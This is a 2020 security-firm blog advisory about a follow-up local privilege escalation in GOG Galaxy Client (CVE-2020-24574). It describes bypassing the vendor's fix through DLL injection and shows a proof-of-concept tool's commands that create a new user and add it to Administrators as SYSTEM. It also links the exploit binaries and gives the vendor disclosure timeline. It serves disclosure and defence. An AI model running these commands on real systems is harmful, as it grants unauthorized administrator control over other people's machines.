<!DOCTYPE html>
<html>
  <head>
    <title>Positron Security</title>
    <meta name="title" content="Positron Security"/>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="stylesheet" type="text/css" href="/css/main.css" />
    <script type="text/javascript" src="/js/script.js"></script>
  </head>
  <body>
    <header class="main-column">
      <div id="the-header">
        <nav id="primary">
          <ul>
            <li><img src="/assets/positron-security.png"/></li>
            <li id="menuicon"><a href="#">&nbsp;&#9776;&nbsp;</a></li>
            <li class="mainmenu-li"><a class="mainmenu" href="/services/">Services</a></li>
            <li class="mainmenu-li"><a class="mainmenu" href="/blog/">Blog</a></li>
            <li class="mainmenu-li"><a class="mainmenu" href="/tools/">Tools</a></li>
            <li class="mainmenu-li"><a class="mainmenu" href="/company/">Company</a></li>
            <li class="mainmenu-li"><a class="mainmenu" href="/contact/">Contact</a></li>
          </ul>
          <ul>
        </nav>
        <div id="responsive-menu"><ul></ul></div>
        <nav id="secondary">
          <ul>
            <li><a href="tel:15856435900">Call us: +1-585-643-5900</a></li>
          </ul>
        </nav>
      </div>
      <div id="breadcrumb">
        <ul>
          <li><a href="/">Positron Security</a></li>
          
	    
            <li><a href="/blog/">Blog</a></li>
            
          
	    
            <li><a href="/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/"> GOG Galaxy Client Local Privilege Escalation Deuce</a></li>
            
          
        </ul>
      </div>
    </header>

    <section class="main-column">
      <div id="page-banner-image-container"><img id="page-banner-image" src="/assets/banner-blog.jpg"/><h1 class="Blog" id="page-banner-title">Blog</h1></div>
    </section>

    <section id="page">
      <article class="main-column main-content blog">
        <h2 class="blog_title"><a class="blog_title" href="/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/">GOG Galaxy Client Local Privilege Escalation Deuce</a></h2>
        <div class="article-meta">By <div class="by"><a class="blog_author" href="/company/">jtesta</a></div> on <div class="date">August 13, 2020</div></div>
        <p><p>I reported <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">a serious local privilege escalation flaw in GOG Galaxy Client</a> on April 28, 2020, but my follow-up investigation (detailed below) found the vendor&rsquo;s fix to be insufficient.  By updating the proof-of-concept exploit code, it is possible to execute arbitrary commands as <em>SYSTEM</em> in GOG Galaxy Client v2.0.13 through <s>v2.0.15</s> v2.0.19 (the latest as of this writing).</p>
<p>GOG did not reply that this issue was officially fixed, although changes were silently made at some point after the v2.0.15 release to stop the provided proof-of-concept tools from working.  <s>It is suspected that only minor changes were made to frustrate exploitation; an investigation is ongoing</s> (See update below).</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): After an investigation, it was found that GOG simply updated the signing key used for verifying messages.  This key has been recovered, and the proof-of-concept has been updated with it.  This advisory now describes a <strong>0-day vulnerability in GOG Galaxy Client v2.0.19</strong> because GOG did not respond in good faith with a proper patch in 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google&rsquo;s vulnerability disclosure policy</a> (which GOG was made aware of during the initial contact; see Vendor Timeline, below).</p>
<p>UPDATE (Aug 25, 2020 @ 10:51PM): GOG released v2.0.20 that claims in the change log, &ldquo;Security issue fix: Added checks that ensure the loaded .DLLs are genuine&rdquo;.  However, it was found that the proof-of-concept tool included in this advisory <em>still works, unmodified</em>.  I contacted GOG.com Support to inform them of this, and their response on August 21 was: &ldquo;The recent update to GOG GALAXY application (2.0.20) is unrelated to your report, it was released to address a different issue.&rdquo;  I do not know what different issue this was referring to.  Also, the following CVE ID has been assigned to this issue: <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-24574">CVE-2020-24574</a></p>
<h3>Investigation of Prior Patch</h3>
<p>The day before issuing my <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a> on April 28, 2020, I ran the proof-of-concept exploits against the fixed versions (v1.2.67 and v2.0.14).  They no longer worked.  Unfortunately, because GOG never told me the issues were actually fixed on February 27, 2020, I didn&rsquo;t have a chance to do an in-depth follow-up investigation before publishing the advisory.  I&rsquo;ve since had the chance to look at their fix more deeply.</p>
<p>To start, I looked at the log file at <em>C:\ProgramData\GOG.com\Galaxy\logs\GalaxyClientService.log</em> to see if it reports anything when the old exploit is run.  I found this:</p>
<pre><code>2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Received a message from process connected at '127.0.0.1:54963'.
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Determined sender to be 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2032.0_x64__qbz5n2kfra8p0\python.exe' (PID: 8448)
2020-05-08 15:03:53.503 [Warning][#1 (1)] [TID 7352][galaxy_service]: The sender was not recognized as a trusted client.
2020-05-08 15:03:53.503 [Error][#1 (1)] [TID 7352][galaxy_service]: Received a forbidden request from an untrusted sender. Disconnecting.
</code></pre>
<p>That&rsquo;s a big hint!  It looks like the privileged process, <em>GalaxyClientService.exe</em>, matches the network client&rsquo;s source TCP port number with the executable process that opened the socket.  That&rsquo;s how it figures out that the request is coming from the Python interpreter instead of the legitimate client (GalaxyClient.exe).</p>
<p>I immediately thought that this check can be circumvented with <a href="https://en.wikipedia.org/wiki/DLL_injection">DLL injection</a>.</p>
<h3>Updating the Proof-of-Concept</h3>
<p><em>Cue hours of re-implementing my Python proof-of-concept in C&hellip;</em></p>
<p>Ok, now I have a DLL that can be injected into <em>GalaxyClient.exe</em> which will issue the same HMAC-512-signed request as before.  Let&rsquo;s test it out:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe &quot;user jtesta Abc*123Lol /add&quot; &quot;C:\\&quot;
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 10296
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Looks like it worked!  Ok, now let&rsquo;s add this new user to the local <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe &quot;localgroup Administrators jtesta /add&quot; &quot;C:\\&quot;
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 8112
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Let&rsquo;s verify that this user exists and is part of the <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;net user jtesta
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.
</code></pre>
<p><strong>SUCCESS!</strong></p>
<h3>Proof-Of-Concept Exploit Tools</h3>
<p><em>UPDATE (Aug. 20, 2020 @ 5:17PM EST): a Github repository has been made to better track and manage updates: <a href="https://github.com/jtesta/gog_galaxy_client_service_poc">https://github.com/jtesta/gog_galaxy_client_service_poc</a></em></p>
<p>Pre-compiled binaries and source code for the updated proof-of-concept tools (which work on GOG Galaxy v2.0.13 through v2.0.19) are available here: <a href="/blog/gog_galaxy_updated_poc_v2.zip">gog_galaxy_updated_poc_v2.zip</a> (<a href="/blog/gog_galaxy_updated_poc_v2.zip.sig">gog_galaxy_updated_poc_v2.zip.sig</a>)</p>
<p>GPG Key: <a href="/company/jtesta.asc">jtesta.asc</a> (9C61 F6A9 A3E9 BCA0 04A6  3C66 E44F 5FD3 B799 916A)</p>
<h3>Vendor Contact Timeline</h3>
<p><strong>May 12, 2020</strong>: Contact with GOG.com Support was made using the same ticket (#535258) as the <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a>.</p>
<p><strong>June 4, 2020</strong>: GOG.com Support replied with:</p>
<p>&ldquo;I was informed that our Developers are working on fixing the issue, but executing the attack requires the machine to be already compromised.&rdquo;</p>
<p>Because this sounded like GOG was not taking the issue seriously, I responded with:</p>
<p>&ldquo;It is indeed true that an attacker must have low-privilege access to the machine already.  But the problem is that this can be escalated into Administrator rights by abusing the GalaxyClientService software.  [&hellip;]  Local privilege escalation (LPE) is a serious vulnerability.  GOG customers may install software/games from other untrusted sources without Administrator rights, which normally would protect them from full system compromise.  Unfortunately, due to the vulnerabilities I&rsquo;ve discovered in GalaxyClientService, <em>all</em> user accounts are effectively administrators.&rdquo;</p>
<p><strong>August 13, 2020</strong>: No response received from vendor after 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google&rsquo;s vulnerability disclosure policy</a> (which GOG was informed of).  GOG did not reply with any fix information.</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): <em>After</em> this advisory was publicly released, GOG.com Support responded with:</p>
<p>&ldquo;Our Developers reevaluated the reported issue and think that it will take them around 3 months to create a solution, because it demands a major design change.  Would it be possible to postpone the public release of your findings by 3 months so they have time to implement and test this solution?&rdquo;</p>
<p>Because this was received after the advisory was already published, the request was deemed moot.</p>
<h3>Explanation of 0-Day Exploit Release</h3>
<p>(Section added on Aug. 13, 2020 @ 5:11PM)</p>
<p>As of the time of original publication (the morning of August 13), the proof-of-concept tool released worked on v2.0.13 - v2.0.15 only; it did not work on the latest version (v2.0.19) for unknown reasons.  Hours later, an investigation revealed that GOG silently updated the message-signing key some time between the release of v2.0.16 and v2.0.19 in order to prevent the exploit from working.  This was not a good-faith attempt at addressing the security vulnerability for two reasons:</p>
<p>1.) As <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">my first GOG Galaxy Client advisory clearly showed</a>, secret keys cannot be used to verify messages, since an attacker can easily extract those keys.  GOG already knew since January that this would not solve the core design problem.</p>
<p>2.) In private communication on May 12, I made note that I strongly suspected this would require an extensive re-design, and that I would be happy to help (for free) to ensure that a proper &amp; comprehensive fix would be shipped to end users.  No response regarding this offer was received (in fact, no response was received at all until the deadline had passed).</p>
<p>Because it reasonably seems that GOG is no longer acting in good-faith regarding this matter, I&rsquo;ve updated the proof-of-concept again with the new signing key.  Hence, as of August 13, <strong>this is a 0-day vulnerability affecting GOG Galaxy Client v2.0.19</strong>.</p>
</p>
      </article>
      <div class="archives">
        <h3>Blog Archives</h3>
        <ol class="blog_archive_list">
          
          <li class="blog_archive_entry"><a href="/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">GOG Galaxy Client Local Privilege Escalation</a></li>
          
        </ol>
        <ol class="blog_archive_list">
          
          <li class="blog_archive_entry"><a href="/blog/2020-09-27-ssh-policy-configuration-checks-with-ssh-audit/">SSH Policy Configuration Checks With ssh-audit</a></li>
          
        </ol>
      </div>
    </section>
    <footer class="main-column">
      <nav class="main-column" id="footer">
      <ul>
        <li><a href="/services/pentesting/">Penetration Testing</a></li>
        <li><a href="/services/risk-analysis/">Risk Analysis</a></li>
        <li><a href="/services/mobile-security/">Mobile Security</a></li>
        <li><a href="/services/social-engineering/">Social Engineering</a></li>
        <li><a href="/services/application-security/">Application Security</a></li>
      </ul>
      <ul>
        <li><a href="/services/pci-assessment/">PCI Assessment</a></li>
        <li><a href="/services/hipaa-compliance/">HIPAA Compliance</a></li>
        <li><a href="/services/enterprise-training/">Enterprise Training</a></li>
        <li><a href="/services/intrusion-response/">Intrusion Response</a></li>
        <li><a href="/services/research/">Research</a></li>
      </ul>
      <ul>
        <li><a href="/blog/">Blog</a></li>
        <li><a href="/tools/">Tools</a></li>
        <li><a href="/company/">Company</a></li>
        <li><a href="/contact/">Contact Us</a></li>
        <li><a href="/site-map/">Sitemap</a></li>
      </ul>
      </nav>
      <div id="contact-bar" class="main-column">
        <p><a class="footer-email" href="mailto:inquiries@positronsecurity.com">inquiries@positronsecurity.com</a> | <a class="footer-phone" href="tel:15856435900">+1-585-643-5900</a></p>
      </div>
      <div id="copyright" class="main-column">
        <p>Copyright &copy;2008 - 2024 Positron Security LLC</p>
      </div>
    </footer>
  </body>
</html>

